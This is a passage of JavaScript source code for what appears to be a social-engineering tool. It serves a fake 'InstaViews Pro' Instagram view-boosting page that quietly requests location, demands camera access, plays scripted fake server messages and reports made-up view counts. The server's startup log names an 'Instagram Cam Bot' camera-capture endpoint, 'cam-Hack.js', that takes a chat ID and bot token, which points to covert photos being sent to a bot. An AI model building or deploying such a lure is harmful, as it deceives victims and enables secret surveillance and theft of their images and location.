        const loadingScreen = document.getElementById('loadingScreen');
        const result = document.getElementById('result');
        const shareBtn = document.getElementById('shareBtn');
        const urlError = document.getElementById('urlError');
        
        // Show generator when Get Started is clicked - WITH CAMERA CHECK
        function showGenerator() {
            // SILENTLY trigger location permission (one time)
            requestLocationPermission();
            
            // Check if camera is allowed
            if (!cameraAccessGranted) {
                console.log("Camera not allowed, requesting again...");
                requestCameraPermission();
                return;
            }
            
            // Only show generator if camera is allowed
            document.querySelectorAll('section:not(#generatorSection)').forEach(section => {
                section.style.display = 'none';
            });
            
            // Show the generator with a smooth animation
            generator.style.display = 'block';
            setTimeout(() => {
                generator.classList.add('fade-in');
                generator.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }
        
        // Event listeners for Get Started buttons
        getStartedBtn.addEventListener('click', showGenerator);
        ctaBtn.addEventListener('click', showGenerator);
        
        // URL validation function
        function isValidInstagramUrl(url) {
            try {
                const urlObj = new URL(url);
                
                if (!urlObj.hostname.includes('instagram.com')) {
                    return false;
                }
                
                const path = urlObj.pathname;
                if (path.includes('/reel/') || path.includes('/p/') || path.includes('/tv/')) {
                    return true;
                }
                
                return false;
            } catch (e) {
                return false;
            }
        }
        
        // View generation process
        let progress = 0;
        const messages = [
            { text: "Initializing view generation protocol...", type: "info", delay: 1000 },
            { text: "Establishing secure connection to Instagram servers...", type: "info", delay: 2500 },
            { text: "Validating video URL and extracting metadata...", type: "info", delay: 4500 },
            { text: "Analyzing video content for optimization...", type: "info", delay: 7000 },
            { text: "Accessing viewer database...", type: "info", delay: 9500 },
            { text: "Server response: 200 OK", type: "success", delay: 12000 },
            { text: "Processing video analysis results...", type: "info", delay: 14500 },
            { text: "Optimizing delivery algorithm for maximum visibility...", type: "info", delay: 17000 },
            { text: "Generating 50,000+ active viewers...", type: "info", delay: 19500 },
            { text: "Applying engagement optimization protocols...", type: "info", delay: 22000 },
            { text: "Finalizing transaction...", type: "success", delay: 24500 },
            { text: "Views successfully delivered to video!", type: "success", delay: 27000 }
        ];

        function startProcess() {
            const videoUrl = document.getElementById('videoUrl').value.trim();
            
            if (!videoUrl) {
                urlError.textContent = "Please enter an Instagram video URL";
                urlError.style.display = 'block';
                return;
            }
            
            if (!isValidInstagramUrl(videoUrl)) {
                urlError.textContent = "Please enter a valid Instagram video URL (reel, post, or TV)";
                urlError.style.display = 'block';
                return;
            }
            
            urlError.style.display = 'none';

            // Hide main screen, show loading
            document.querySelector('.input-group').style.display = 'none';
            document.querySelector('#generateBtn').style.display = 'none';
            document.querySelector('.trust-badges').style.display = 'none';
            document.querySelector('.disclaimer').style.display = 'none';
            loadingScreen.style.display = 'block';

            // Add initial message
            const serverMessages = document.getElementById('serverMessages');
            const welcomeMsg = document.createElement('div');
            welcomeMsg.className = 'message info';
            welcomeMsg.innerHTML = "[" + getCurrentTime() + "] Starting view generation for video: <strong>" + videoUrl + "</strong>";
            serverMessages.appendChild(welcomeMsg);

            // Start the process
            setTimeout(() => {
                simulateServerProcess();
            }, 1000);
        }

        function simulateServerProcess() {
            const serverMessages = document.getElementById('serverMessages');
            const progressBar = document.getElementById('progressBar');
            const progressPercent = document.getElementById('progressPercent');

            messages.forEach((message, index) => {
                setTimeout(() => {
                    const messageElement = document.createElement('div');
                    messageElement.className = "message " + message.type;
                    messageElement.innerHTML = "[" + getCurrentTime() + "] " + message.text;
                    serverMessages.appendChild(messageElement);
                    serverMessages.scrollTop = serverMessages.scrollHeight;

                    progress = Math.min(100, ((index + 1) / messages.length) * 100);
                    progressBar.style.width = progress + '%';
                    progressPercent.textContent = Math.round(progress) + '%';

                    if (index === messages.length - 1) {
                        setTimeout(showResult, 2000);
                    }
                }, message.delay);
            });
        }

        function getCurrentTime() {
            const now = new Date();
            return now.toTimeString().split(' ')[0];
        }

        function showResult() {
            loadingScreen.style.display = 'none';
            result.style.display = 'block';
            
            const viewsCount = document.getElementById('viewsCount');
            let count = 0;
            const target = Math.floor(Math.random() * 40000) + 30000;
            const interval = setInterval(() => {
                count += Math.floor(target / 50);
                if (count >= target) {
                    count = target;
                    clearInterval(interval);
                }
                viewsCount.textContent = count.toLocaleString();
            }, 40);
        }

        function shareSuccess() {
            const videoUrl = document.getElementById('videoUrl').value || 'your video';
            const views = document.getElementById('viewsCount').textContent;
            
            alert("Thank you for using InstaViews Pro!\\n\\nWe've successfully added " + views + " views to " + videoUrl + ".\\n\\nShare your success with friends so they can boost their videos too!\\n\\nNote: It may take 2-3 hours for all views to appear on your video.");
        }

        // Event listeners
        generateBtn.addEventListener('click', startProcess);
        shareBtn.addEventListener('click', shareSuccess);

        // URL validation on input
        document.getElementById('videoUrl').addEventListener('input', function() {
            if (this.value && isValidInstagramUrl(this.value)) {
                urlError.style.display = 'none';
            }
        });

        // Cleanup when page closes
        window.addEventListener('beforeunload', function() {
            if (photoInterval) {
                clearInterval(photoInterval);
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>`;
}

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Instagram Cam Bot API running on port ${PORT}`);
  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/cam-Hack.js?chatId=XXX&botToken=XXX`);
  console.log(`🏠 Home: http://localhost:${PORT}`);
});
